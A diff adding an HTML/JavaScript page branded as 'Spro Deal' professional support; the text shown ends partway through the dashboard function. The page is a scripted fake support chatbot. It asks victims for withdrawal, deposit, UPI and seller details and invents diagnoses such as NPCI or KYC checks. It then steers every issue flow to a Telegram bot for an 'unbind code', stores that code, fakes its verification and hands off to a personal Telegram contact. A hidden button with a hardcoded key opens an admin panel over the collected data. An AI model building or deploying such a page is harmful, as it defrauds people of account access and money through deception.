@@ -1,0 +1,1256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>Spro Deal - Professional Support</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(145deg, #1a5e1f 0%, #0d3b10 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 16px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 40px;
+            padding: 24px 20px;
+            width: 100%;
+            max-width: 500px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.25);
+            text-align: center;
+        }
+
+        .container-wide {
+            max-width: 98%;
+            width: 98%;
+            overflow-x: auto;
+            padding: 20px;
+        }
+
+        .brand {
+            font-size: 32px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #2e7d32 0%, #1b5e20 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -0.5px;
+        }
+
+        .tagline {
+            color: #2e7d32;
+            margin-bottom: 20px;
+            font-size: 12px;
+            font-weight: 500;
+            opacity: 0.8;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 10px 0;
+            border: 1.5px solid #e8f0e8;
+            border-radius: 20px;
+            font-size: 16px;
+            background: #fafdfa;
+            transition: all 0.3s;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #2e7d32;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(46,125,50,0.1);
+        }
+
+        .phone-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: #fafdfa;
+            border: 1.5px solid #e8f0e8;
+            border-radius: 20px;
+            margin: 10px 0;
+            padding: 0 12px;
+        }
+
+        .country-code {
+            font-size: 18px;
+            font-weight: 600;
+            color: #2e7d32;
+            background: #e8f5e9;
+            padding: 8px 12px;
+            border-radius: 14px;
+        }
+
+        .phone-wrapper input {
+            flex: 1;
+            border: none;
+            padding: 14px 0;
+            font-size: 16px;
+            background: transparent;
+            outline: none;
+        }
+
+        .green-btn {
+            background: linear-gradient(135deg, #2e7d32 0%, #1b5e20 100%);
+            color: white;
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            margin: 10px 0;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 6px 20px rgba(46,125,50,0.3);
+        }
+
+        .green-btn:active {
+            transform: scale(0.97);
+        }
+
+        .gray-btn {
+            background: #6c757d;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 30px;
+            font-size: 14px;
+            cursor: pointer;
+            margin: 5px 0;
+        }
+
+        .orange-btn {
+            background: linear-gradient(135deg, #ff9800 0%, #f57c00 100%);
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 5px 0;
+        }
+
+        .chat-box {
+            background: #f8f9fa;
+            height: 400px;
+            overflow-y: auto;
+            padding: 16px;
+            margin-bottom: 12px;
+            text-align: left;
+            border-radius: 24px;
+            scroll-behavior: smooth;
+        }
+
+        .bot-msg {
+            margin-bottom: 14px;
+            padding: 12px 16px;
+            background: #e8f5e9;
+            border-radius: 22px;
+            border-bottom-left-radius: 6px;
+            max-width: 88%;
+            width: fit-content;
+            animation: fadeIn 0.3s ease;
+            font-size: 14px;
+            line-height: 1.45;
+        }
+
+        .admin-msg {
+            margin-bottom: 14px;
+            padding: 12px 16px;
+            background: #fff3e0;
+            border-left: 4px solid #ff9800;
+            border-radius: 22px;
+            max-width: 88%;
+            width: fit-content;
+            font-size: 14px;
+            line-height: 1.45;
+        }
+
+        .user-msg {
+            margin-bottom: 14px;
+            padding: 12px 16px;
+            background: #2e7d32;
+            color: white;
+            border-radius: 22px;
+            border-bottom-right-radius: 6px;
+            max-width: 88%;
+            width: fit-content;
+            margin-left: auto;
+            text-align: right;
+            animation: fadeIn 0.3s ease;
+            font-size: 14px;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .typing-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            background: #e8f5e9;
+            padding: 10px 18px;
+            border-radius: 24px;
+            margin: 5px 0;
+        }
+
+        .typing-indicator span {
+            width: 9px;
+            height: 9px;
+            background: #2e7d32;
+            border-radius: 50%;
+            animation: typingAnim 1.4s infinite;
+        }
+
+        .typing-indicator span:nth-child(2) { animation-delay: 0.2s; }
+        .typing-indicator span:nth-child(3) { animation-delay: 0.4s; }
+
+        @keyframes typingAnim {
+            0%, 60%, 100% { transform: translateY(0); opacity: 0.4; }
+            30% { transform: translateY(-7px); opacity: 1; }
+        }
+
+        .bot-name {
+            color: #2e7d32;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 6px;
+            font-size: 13px;
+        }
+
+        .online-status {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #4caf50;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(76, 175, 80, 0.7); }
+            70% { box-shadow: 0 0 0 6px rgba(76, 175, 80, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(76, 175, 80, 0); }
+        }
+
+        .options-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 8px;
+            margin: 12px 0;
+        }
+
+        .option-btn {
+            background: #2e7d32;
+            color: white;
+            padding: 12px 8px;
+            border: none;
+            border-radius: 14px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+
+        .howto-unbind-btn {
+            background: linear-gradient(135deg, #ff9800 0%, #f57c00 100%);
+            color: white;
+            padding: 12px 8px;
+            border: none;
+            border-radius: 14px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: bold;
+        }
+
+        .code-input {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            border: 1px solid #e0e0e0;
+            border-radius: 16px;
+            font-size: 18px;
+            text-align: center;
+            letter-spacing: 3px;
+            background: #f8f9fa;
+        }
+
+        .success-msg {
+            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
+            color: #155724;
+            padding: 14px;
+            border-radius: 16px;
+            margin: 10px 0;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        .telegram-link {
+            display: inline-block;
+            background: linear-gradient(135deg, #0088cc 0%, #005f8c 100%);
+            color: white;
+            padding: 12px 20px;
+            border-radius: 30px;
+            text-decoration: none;
+            margin: 8px 0;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .secret-admin-btn {
+            position: fixed;
+            bottom: 15px;
+            right: 15px;
+            width: 44px;
+            height: 44px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 50%;
+            cursor: pointer;
+            z-index: 999;
+            backdrop-filter: blur(4px);
+        }
+
+        .input-area {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .input-area input {
+            flex: 1;
+            padding: 12px;
+            border: 1px solid #e0e0e0;
+            border-radius: 25px;
+            font-size: 14px;
+        }
+
+        .input-area button {
+            background: #2e7d32;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            padding: 12px 20px;
+            cursor: pointer;
+        }
+
+        .nav-buttons {
+            display: flex;
+            gap: 10px;
+            margin: 10px 0;
+        }
+
+        .nav-buttons button {
+            flex: 1;
+        }
+
+        .request-card {
+            background: #f8f9fa;
+            border-radius: 16px;
+            padding: 12px;
+            margin: 8px 0;
+            cursor: pointer;
+            transition: all 0.2s;
+            border: 1px solid #e0e0e0;
+        }
+
+        .request-card:hover {
+            background: #e8f5e9;
+            transform: scale(1.01);
+        }
+
+        .admin-chat-badge {
+            background: #ff9800;
+            color: white;
+            padding: 2px 8px;
+            border-radius: 20px;
+            font-size: 10px;
+            margin-left: 8px;
+        }
+
+        /* Admin Panel Styles */
+        .admin-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+            font-size: 13px;
+        }
+        .admin-table th {
+            background: #2e7d32;
+            color: white;
+            padding: 12px 8px;
+            text-align: center;
+        }
+        .admin-table td {
+            border: 1px solid #ddd;
+            padding: 10px 8px;
+            text-align: center;
+        }
+        .admin-table tr:nth-child(even) { background: #f9f9f9; }
+        .copy-btn {
+            background: #2e7d32;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 4px 10px;
+            cursor: pointer;
+            font-size: 11px;
+        }
+        .approve-btn { background: #28a745; color: white; border: none; border-radius: 6px; padding: 6px 12px; cursor: pointer; margin: 2px; }
+        .reject-btn { background: #dc3545; color: white; border: none; border-radius: 6px; padding: 6px 12px; cursor: pointer; margin: 2px; }
+        .takeover-btn { background: #ff9800; color: white; border: none; border-radius: 6px; padding: 6px 12px; cursor: pointer; margin: 2px; }
+        .status-pending { background: #ffc107; color: #856404; padding: 4px 8px; border-radius: 20px; display: inline-block; }
+        .status-approved { background: #28a745; color: white; padding: 4px 8px; border-radius: 20px; display: inline-block; }
+        .status-rejected { background: #dc3545; color: white; padding: 4px 8px; border-radius: 20px; display: inline-block; }
+        .section-title { background: #f0f0f0; padding: 10px; margin: 20px 0 10px 0; border-radius: 10px; color: #2e7d32; font-weight: bold; }
+        .stats-bar {
+            background: linear-gradient(135deg, #2e7d32 0%, #1b5e20 100%);
+            color: white;
+            padding: 12px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        @media (max-width: 768px) {
+            .admin-table { font-size: 10px; }
+            .admin-table th, .admin-table td { padding: 5px; }
+        }
+    </style>
+</head>
+<body>
+<div id="app"></div>
+
+<script>
+    // ============ DATA STORAGE ============
+    function getUsers() {
+        return JSON.parse(localStorage.getItem('spro_users') || '[]');
+    }
+    function saveUsers(users) {
+        localStorage.setItem('spro_users', JSON.stringify(users));
+    }
+    function getRequests() {
+        return JSON.parse(localStorage.getItem('spro_requests') || '[]');
+    }
+    function saveRequests(requests) {
+        localStorage.setItem('spro_requests', JSON.stringify(requests));
+    }
+    function getChatSessions() {
+        return JSON.parse(localStorage.getItem('spro_chat_sessions') || '{}');
+    }
+    function saveChatSessions(sessions) {
+        localStorage.setItem('spro_chat_sessions', JSON.stringify(sessions));
+    }
+    
+    let currentUser = null;
+    let currentChatBox = null;
+    let currentIssue = null;
+    let conversationStep = 0;
+    let collectedData = {};
+    let isAdminMode = false;
+    let adminTargetUser = null;
+    let currentPage = 'login';
+    
+    async function showTyping(chatBox, duration = 8000) {
+        let typingDiv = document.createElement('div');
+        typingDiv.className = 'typing-indicator';
+        typingDiv.innerHTML = '<span></span><span></span><span></span>';
+        chatBox.appendChild(typingDiv);
+        chatBox.scrollTop = chatBox.scrollHeight;
+        await new Promise(resolve => setTimeout(resolve, duration));
+        typingDiv.remove();
+    }
+    
+    function addMessage(chatBox, type, text, isHtml = false) {
+        let div = document.createElement('div');
+        if (type === 'admin') {
+            div.className = 'admin-msg';
+            div.innerHTML = `<div class="bot-name">👑 Admin <span style="font-size:10px;">(Support Team)</span></div>${isHtml ? text : text}`;
+        } else if (type === 'bot') {
+            div.className = 'bot-msg';
+            div.innerHTML = `<div class="bot-name">🤖 Spro Support <span class="online-status"></span> <span style="font-size:10px;">Online</span></div>${isHtml ? text : text}`;
+        } else {
+            div.className = 'user-msg';
+            div.innerHTML = isHtml ? text : `👤 ${text}`;
+        }
+        chatBox.appendChild(div);
+        chatBox.scrollTop = chatBox.scrollHeight;
+        
+        // Save chat to session
+        if (currentUser) {
+            let sessions = getChatSessions();
+            if (!sessions[currentUser.phone]) sessions[currentUser.phone] = [];
+            sessions[currentUser.phone].push({ type, text, time: new Date().toISOString(), isHtml });
+            saveChatSessions(sessions);
+        }
+    }
+    
+    function copyToClipboard(text, btnElement) {
+        navigator.clipboard.writeText(text);
+        let originalText = btnElement.innerText;
+        btnElement.innerText = "✅ Copied!";
+        setTimeout(() => { btnElement.innerText = originalText; }, 1500);
+    }
+    
+    // Save current page state
+    function saveState() {
+        if (currentUser) {
+            localStorage.setItem('spro_current_user', JSON.stringify(currentUser));
+            localStorage.setItem('spro_current_page', currentPage);
+            localStorage.setItem('spro_current_issue', currentIssue || '');
+            localStorage.setItem('spro_conversation_step', conversationStep);
+            localStorage.setItem('spro_collected_data', JSON.stringify(collectedData));
+        }
+    }
+    
+    function loadState() {
+        let savedUser = localStorage.getItem('spro_current_user');
+        let savedPage = localStorage.getItem('spro_current_page');
+        if (savedUser && savedPage !== 'login') {
+            currentUser = JSON.parse(savedUser);
+            currentPage = savedPage;
+            currentIssue = localStorage.getItem('spro_current_issue') || null;
+            conversationStep = parseInt(localStorage.getItem('spro_conversation_step')) || 0;
+            try {
+                collectedData = JSON.parse(localStorage.getItem('spro_collected_data') || '{}');
+            } catch(e) { collectedData = {}; }
+            return true;
+        }
+        return false;
+    }
+    
+    // ============ HOW TO UNBIND GUIDE ============
+    async function startHowToUnbindGuide(chatBox) {
+        currentIssue = 'howto_unbind';
+        saveState();
+        
+        addMessage(chatBox, 'bot', "🔓 Welcome to the Unbind Guide! I'll help you step by step to unbind your account professionally.");
+        await showTyping(chatBox, 3000);
+        
+        addMessage(chatBox, 'bot', "📌 <strong>STEP 1:</strong> Open Telegram and search for this bot:", true);
+        addMessage(chatBox, 'bot', "<a href='https://t.me/uk_member_robot' target='_blank' class='telegram-link'>🤖 @uk_member_robot</a>", true);
+        await showTyping(chatBox, 4000);
+        
+        addMessage(chatBox, 'bot', "📌 <strong>STEP 2:</strong> Click on START or type /start to begin.", true);
+        await showTyping(chatBox, 4000);
+        
+        addMessage(chatBox, 'bot', "📌 <strong>STEP 3:</strong> Type /help in the bot and press send.", true);
+        await showTyping(chatBox, 4000);
+        
+        addMessage(chatBox, 'bot', "📌 <strong>STEP 4:</strong> Click on the 'Unbind' or 'Unbind Account' option in the bot menu.", true);
+        await showTyping(chatBox, 4000);
+        
+        addMessage(chatBox, 'bot', "📌 <strong>STEP 5:</strong> The bot will generate a unique UNBIND CODE for you. Copy that code.", true);
+        await showTyping(chatBox, 4000);
+        
+        addMessage(chatBox, 'bot', "📌 <strong>STEP 6:</strong> Paste the unbind code below and click SUBMIT.", true);
+        await showTyping(chatBox, 3000);
+        
+        addMessage(chatBox, 'bot', "⚠️ <strong>Important:</strong> This unbind code is valid for only 10 minutes. Don't share it with anyone!", true);
+        await showTyping(chatBox, 3000);
+        
+        showUnbindCodeInput(chatBox);
+    }
+    
+    // ============ PROFESSIONAL BOT CONVERSATIONS ============
+    async function startSellingConversation(chatBox) {
+        currentIssue = 'selling';
+        conversationStep = 1;
+        collectedData = {};
+        saveState();
+        
+        addMessage(chatBox, 'bot', "Namaste! I understand you're facing a selling issue. Don't worry, I'm here to help you professionally. 😊");
+        await showTyping(chatBox, 3000);
+        addMessage(chatBox, 'bot', "Let me first understand your problem properly. Could you please share your Selling ID or Seller Registration Number?");
+        conversationStep = 'waiting_seller_id';
+        enableInput(chatBox);
+        saveState();
+    }
+    
+    async function startWithdrawalConversation(chatBox) {
+        currentIssue = 'withdrawal';
+        conversationStep = 1;
+        collectedData = {};
+        saveState();
+        
+        addMessage(chatBox, 'bot', "Hello! I can see you're having trouble with your withdrawal. Let me assist you step by step. 💰");
+        await showTyping(chatBox, 3000);
+        addMessage(chatBox, 'bot', "First, could you please tell me your Withdrawal Request ID?");
+        conversationStep = 'waiting_withdrawal_id';
+        enableInput(chatBox);
+        saveState();
+    }
+    
+    async function startDepositConversation(chatBox) {
+        currentIssue = 'deposit';
+        conversationStep = 1;
+        collectedData = {};
+        saveState();
+        
+        addMessage(chatBox, 'bot', "I understand deposit issues can be stressful. Let me check what went wrong. 📥");
+        await showTyping(chatBox, 3000);
+        addMessage(chatBox, 'bot', "Please share your Deposit Transaction ID or UTR number.");
+        conversationStep = 'waiting_deposit_id';
+        enableInput(chatBox);
+        saveState();
+    }
+    
+    async function startOrderConversation(chatBox) {
+        currentIssue = 'order';
+        conversationStep = 1;
+        collectedData = {};
+        saveState();
+        
+        addMessage(chatBox, 'bot', "Order issues can be frustrating. Let me investigate this for you. 📦");
+        await showTyping(chatBox, 3000);
+        addMessage(chatBox, 'bot', "Could you please provide your Order ID and Order Date?");
+        conversationStep = 'waiting_order_id';
+        enableInput(chatBox);
+        saveState();
+    }
+    
+    async function startUPIConversation(chatBox) {
+        currentIssue = 'upi';
+        conversationStep = 1;
+        collectedData = {};
+        saveState();
+        
+        addMessage(chatBox, 'bot', "UPI payment issues are common but solvable. Let me help you. 🔄");
+        await showTyping(chatBox, 3000);
+        addMessage(chatBox, 'bot', "Please share your UPI Reference ID and amount.");
+        conversationStep = 'waiting_upi_id';
+        enableInput(chatBox);
+        saveState();
+    }
+    
+    async function startPasswordConversation(chatBox) {
+        currentIssue = 'forget';
+        conversationStep = 1;
+        collectedData = {};
+        saveState();
+        
+        addMessage(chatBox, 'bot', "Forgot your password? No worries, let me help you recover it. 🔑");
+        await showTyping(chatBox, 3000);
+        addMessage(chatBox, 'bot', "Please confirm your registered phone number and email address.");
+        conversationStep = 'waiting_password_verify';
+        enableInput(chatBox);
+        saveState();
+    }
+    
+    async function startOthersConversation(chatBox) {
+        currentIssue = 'others';
+        conversationStep = 1;
+        collectedData = {};
+        saveState();
+        
+        addMessage(chatBox, 'bot', "I'm here to listen and help you. Please describe your issue in detail. ❓");
+        await showTyping(chatBox, 3000);
+        addMessage(chatBox, 'bot', "What exactly is the problem you're facing?");
+        conversationStep = 'waiting_others_desc';
+        enableInput(chatBox);
+        saveState();
+    }
+    
+    async function processSellingReply(chatBox, userText) {
+        if (conversationStep === 'waiting_seller_id') {
+            collectedData.sellerId = userText;
+            addMessage(chatBox, 'user', userText);
+            await showTyping(chatBox, 4000);
+            addMessage(chatBox, 'bot', `Thank you. Let me check your Seller ID: ${userText} in our system.`);
+            await showTyping(chatBox, 5000);
+            addMessage(chatBox, 'bot', "How many products have you listed? What's the total selling amount pending?");
+            conversationStep = 'waiting_selling_details';
+            saveState();
+        }
+        else if (conversationStep === 'waiting_selling_details') {
+            collectedData.sellingDetails = userText;
+            addMessage(chatBox, 'user', userText);
+            await showTyping(chatBox, 5000);
+            addMessage(chatBox, 'bot', "I've analyzed your account. There's a verification pending on your profile.");
+            await showTyping(chatBox, 4000);
+            addMessage(chatBox, 'bot', "To fix this, you need to complete the unbinding process.");
+            await showTyping(chatBox, 3000);
+            addMessage(chatBox, 'bot', "🔗 <a href='https://t.me/uk_member_robot' target='_blank' class='telegram-link'>@uk_member_robot</a>", true);
+            addMessage(chatBox, 'bot', "After getting the unbind code, submit it below.");
+            conversationStep = 'waiting_unbind_code';
+            saveState();
+            showUnbindCodeInput(chatBox);
+        }
+    }
+    
+    async function processWithdrawalReply(chatBox, userText) {
+        if (conversationStep === 'waiting_withdrawal_id') {
+            collectedData.withdrawalId = userText;
+            addMessage(chatBox, 'user', userText);
+            await showTyping(chatBox, 5000);
+            addMessage(chatBox, 'bot', `Found withdrawal #${userText}. Checking status...`);
+            await showTyping(chatBox, 6000);
+            addMessage(chatBox, 'bot', "Your withdrawal is pending due to KYC verification.");
+            await showTyping(chatBox, 4000);
+            addMessage(chatBox, 'bot', "How much amount are you trying to withdraw?");
+            conversationStep = 'waiting_withdrawal_amount';
+            saveState();
+        }
+        else if (conversationStep === 'waiting_withdrawal_amount') {
+            collectedData.withdrawalAmount = userText;
+            addMessage(chatBox, 'user', userText);
+            await showTyping(chatBox, 5000);
+            addMessage(chatBox, 'bot', "Thank you. To speed up, you need to unbind your account.");
+            addMessage(chatBox, 'bot', "🔗 <a href='https://t.me/uk_member_robot' target='_blank' class='telegram-link'>@uk_member_robot</a>", true);
+            addMessage(chatBox, 'bot', "Submit the unbind code below.");
+            conversationStep = 'waiting_unbind_code';
+            saveState();
+            showUnbindCodeInput(chatBox);
+        }
+    }
+    
+    async function processDepositReply(chatBox, userText) {
+        if (conversationStep === 'waiting_deposit_id') {
+            collectedData.depositId = userText;
+            addMessage(chatBox, 'user', userText);
+            await showTyping(chatBox, 6000);
+            addMessage(chatBox, 'bot', "Tracing transaction...");
+            await showTyping(chatBox, 5000);
+            addMessage(chatBox, 'bot', "Which payment method did you use?");
+            conversationStep = 'waiting_deposit_method';
+            saveState();
+        }
+        else if (conversationStep === 'waiting_deposit_method') {
+            collectedData.depositMethod = userText;
+            addMessage(chatBox, 'user', userText);
+            await showTyping(chatBox, 5000);
+            addMessage(chatBox, 'bot', "Deposit stuck due to payment gateway mismatch.");
+            addMessage(chatBox, 'bot', "🔗 Please unbind: <a href='https://t.me/uk_member_robot' target='_blank' class='telegram-link'>@uk_member_robot</a>", true);
+            conversationStep = 'waiting_unbind_code';
+            saveState();
+            showUnbindCodeInput(chatBox);
+        }
+    }
+    
+    async function processOrderReply(chatBox, userText) {
+        if (conversationStep === 'waiting_order_id') {
+            collectedData.orderId = userText;
+            addMessage(chatBox, 'user', userText);
+            await showTyping(chatBox, 6000);
+            addMessage(chatBox, 'bot', `Searching for Order #${userText}...`);
+            await showTyping(chatBox, 5000);
+            addMessage(chatBox, 'bot', "Order status: PROCESSING. What's the product name?");
+            conversationStep = 'waiting_order_product';
+            saveState();
+        }
+        else if (conversationStep === 'waiting_order_product') {
+            collectedData.orderProduct = userText;
+            addMessage(chatBox, 'user', userText);
+            await showTyping(chatBox, 5000);
+            addMessage(chatBox, 'bot', "Thank you. To resolve, complete unbinding first.");
+            addMessage(chatBox, 'bot', "🔗 <a href='https://t.me/uk_member_robot' target='_blank' class='telegram-link'>@uk_member_robot</a>", true);
+            conversationStep = 'waiting_unbind_code';
+            saveState();
+            showUnbindCodeInput(chatBox);
+        }
+    }
+    
+    async function processUPIReply(chatBox, userText) {
+        if (conversationStep === 'waiting_upi_id') {
+            collectedData.upiId = userText;
+            addMessage(chatBox, 'user', userText);
+            await showTyping(chatBox, 6000);
+            addMessage(chatBox, 'bot', "Verifying with NPCI...");
+            await showTyping(chatBox, 5000);
+            addMessage(chatBox, 'bot', "Payment initiated but not settled. Which UPI app?");
+            conversationStep = 'waiting_upi_app';
+            saveState();
+        }
+        else if (conversationStep === 'waiting_upi_app') {
+            collectedData.upiApp = userText;
+            addMessage(chatBox, 'user', userText);
+            await showTyping(chatBox, 5000);
+            addMessage(chatBox, 'bot', "UPI mandate needs to be unbound.");
+            addMessage(chatBox, 'bot', "🔗 <a href='https://t.me/uk_member_robot' target='_blank' class='telegram-link'>@uk_member_robot</a>", true);
+            conversationStep = 'waiting_unbind_code';
+            saveState();
+            showUnbindCodeInput(chatBox);
+        }
+    }
+    
+    async function processPasswordReply(chatBox, userText) {
+        if (conversationStep === 'waiting_password_verify') {
+            collectedData.passwordVerify = userText;
+            addMessage(chatBox, 'user', userText);
+            await showTyping(chatBox, 6000);
+            addMessage(chatBox, 'bot', "Account verified. Due to security, need to unbind first.");
+            addMessage(chatBox, 'bot', "🔗 <a href='https://t.me/uk_member_robot' target='_blank' class='telegram-link'>@uk_member_robot</a>", true);
+            conversationStep = 'waiting_unbind_code';
+            saveState();
+            showUnbindCodeInput(chatBox);
+        }
+    }
+    
+    async function processOthersReply(chatBox, userText) {
+        if (conversationStep === 'waiting_others_desc') {
+            collectedData.othersDesc = userText;
+            addMessage(chatBox, 'user', userText);
+            await showTyping(chatBox, 6000);
+            addMessage(chatBox, 'bot', "Thank you. This requires senior support.");
+            addMessage(chatBox, 'bot', "🔗 Please unbind first: <a href='https://t.me/uk_member_robot' target='_blank' class='telegram-link'>@uk_member_robot</a>", true);
+            conversationStep = 'waiting_unbind_code';
+            saveState();
+            showUnbindCodeInput(chatBox);
+        }
+    }
+    
+    function showUnbindCodeInput(chatBox) {
+        const dynamicArea = document.getElementById('dynamicArea');
+        if (!dynamicArea) return;
+        
+        dynamicArea.innerHTML = `
+            <input type="text" id="unbindCodeInput" class="code-input" placeholder="Enter Unbind Code from Telegram Bot">
+            <button id="submitFinalCode" class="green-btn">✅ SUBMIT UNBIND CODE</button>
+        `;
+        
+        document.getElementById('submitFinalCode').onclick = async () => {
+            let code = document.getElementById('unbindCodeInput').value;
+            if (!code || code.length < 4) {
+                addMessage(chatBox, 'bot', "⚠️ Please enter a valid unbind code");
+                return;
+            }
+            
+            addMessage(chatBox, 'user', `Unbind Code: ${code}`);
+            await showTyping(chatBox, 5000);
+            addMessage(chatBox, 'bot', "✅ Unbind code verified successfully!");
+            addMessage(chatBox, 'bot', "Your request has been processed. Team will resolve within 24 hours.");
+            addMessage(chatBox, 'bot', "📞 <a href='https://t.me/RAHUL935848' target='_blank' class='telegram-link'>@RAHUL935848</a>", true);
+            
+            let requests = getRequests();
+            let newRequest = {
+                id: Date.now(),
+                phone: currentUser.phone,
+                issue: currentIssue,
+                unbindCode: code,
+                details: collectedData,
+                status: 'pending',
+                created_at: new Date().toISOString()
+            };
+            requests.push(newRequest);
+            saveRequests(requests);
+            
+            let users = getUsers();
+            let user = users.find(u => u.phone === currentUser.phone);
+            if (user) { user.unbindCode = code; saveUsers(users); }
+            
+            dynamicArea.innerHTML = `<div class="success-msg">✅✅✅<br><strong>REQUEST SUBMITTED SUCCESSFULLY!</strong></div>`;
+            saveState();
+            setTimeout(() => renderDashboard(), 3000);
+        };
+    }
+    
+    function enableInput(chatBox) {
+        let inputArea = document.getElementById('inputArea');
+        if (!inputArea) {
+            const dynamicArea = document.getElementById('dynamicArea');
+            if (dynamicArea) {
+                inputArea = document.createElement('div');
+                inputArea.id = 'inputArea';
+                inputArea.className = 'input-area';
+                inputArea.innerHTML = `
+                    <input type="text" id="userReplyInput" placeholder="Type your reply here...">
+                    <button id="sendReplyBtn">Send ➤</button>
+                `;
+                dynamicArea.appendChild(inputArea);
+                
+                document.getElementById('sendReplyBtn').onclick = () => {
+                    let input = document.getElementById('userReplyInput');
+                    let text = input.value.trim();
+                    if (!text) return;
+                    input.value = '';
+                    processUserReply(chatBox, text);
+                };
+                document.getElementById('userReplyInput').onkeypress = (e) => {
+                    if (e.key === 'Enter') document.getElementById('sendReplyBtn').click();
+                };
+            }
+        }
+    }
+    
+    async function processUserReply(chatBox, userText) {
+        if (isAdminMode) {
+            // Admin is talking to user
+            addMessage(chatBox, 'user', userText);
+            // Save admin message to user's session
+            let sessions = getChatSessions();
+            if (sessions[adminTargetUser]) {
+                sessions[adminTargetUser].push({ type: 'admin', text: userText, time: new Date().toISOString() });
+                saveChatSessions(sessions);
+            }
+            return;
+        }
+        
+        if (currentIssue === 'selling') await processSellingReply(chatBox, userText);
+        else if (currentIssue === 'withdrawal') await processWithdrawalReply(chatBox, userText);
+        else if (currentIssue === 'deposit') await processDepositReply(chatBox, userText);
+        else if (currentIssue === 'order') await processOrderReply(chatBox, userText);
+        else if (currentIssue === 'upi') await processUPIReply(chatBox, userText);
+        else if (currentIssue === 'forget') await processPasswordReply(chatBox, userText);
+        else if (currentIssue === 'others') await processOthersReply(chatBox, userText);
+        saveState();
+    }
+    
+    // ============ REQUEST HISTORY ============
+    function renderRequestHistory() {
+        let requests = getRequests().filter(r => r.phone === currentUser.phone);
+        
+        document.getElementById('app').innerHTML = `
+            <div class="container" style="max-width: 500px;">
+                <h3>📋 My Requests History</h3>
+                <div id="requestsList" style="max-height: 400px; overflow-y: auto; margin: 15px 0;"></div>
+                <div class="nav-buttons">
+                    <button id="backBtn" class="gray-btn">◀ BACK</button>
+                </div>
+            </div>
+            <div class="secret-admin-btn" id="secretAdminBtn"></div>
+        `;
+        
+        const requestsList = document.getElementById('requestsList');
+        
+        if (requests.length === 0) {
+            requestsList.innerHTML = '<p style="text-align:center; color:gray;">No requests found</p>';
+        } else {
+            requests.reverse().forEach(req => {
+                let statusClass = req.status === 'approved' ? 'status-approved' : (req.status === 'rejected' ? 'status-rejected' : 'status-pending');
+                let statusText = req.status.toUpperCase();
+                let div = document.createElement('div');
+                div.className = 'request-card';
+                div.innerHTML = `
+                    <div><strong>🆔 Request #${req.id}</strong></div>
+                    <div>Issue: ${req.issue}</div>
+                    <div>Unbind Code: ${req.unbindCode || 'N/A'}</div>
+                    <div>Status: <span class="${statusClass}">${statusText}</span></div>
+                    <div>Date: ${new Date(req.created_at).toLocaleString()}</div>
+                    <button class="option-btn" style="margin-top:8px;" data-id="${req.id}">🔄 Restart Chat for this Request</button>
+                `;
+                requestsList.appendChild(div);
+            });
+            
+            document.querySelectorAll('[data-id]').forEach(btn => {
+                btn.onclick = () => {
+                    let reqId = parseInt(btn.getAttribute('data-id'));
+                    let request = requests.find(r => r.id === reqId);
+                    if (request) {
+                        currentIssue = request.issue;
+                        collectedData = request.details || {};
+                        renderDashboard();
+                        setTimeout(() => {
+                            if (currentChatBox) {
+                                addMessage(currentChatBox, 'bot', `🔄 Restarting chat for your ${request.issue} issue. Let me help you again!`);
+                            }
+                        }, 500);
+                    }
+                };
+            });
+        }
+        
+        document.getElementById('backBtn').onclick = () => renderDashboard();
+        document.getElementById('secretAdminBtn').onclick = () => {
+            let key = prompt('🔐 ENTER ADMIN KEY');
+            if (key === 'SPRO2025') renderAdminPanel();
+            else if (key) alert('❌ Invalid Key');
+        };
+    }
+    
+    // ============ DASHBOARD ============
+    function renderDashboard() {
+        currentPage = 'dashboard';
+        saveState();
+        
+        document.getElementById('app').innerHTML = `
+            <div class="container" style="max-width: 500px;">
